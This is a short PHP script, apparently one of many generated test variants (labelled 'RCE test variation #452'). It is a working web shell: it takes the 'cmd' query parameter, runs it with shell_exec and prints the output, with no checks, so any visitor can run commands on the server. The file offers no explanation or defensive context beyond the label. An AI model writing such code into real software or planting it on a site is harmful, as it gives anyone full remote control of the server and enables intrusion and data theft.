<?php
// RCE test variation #452
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>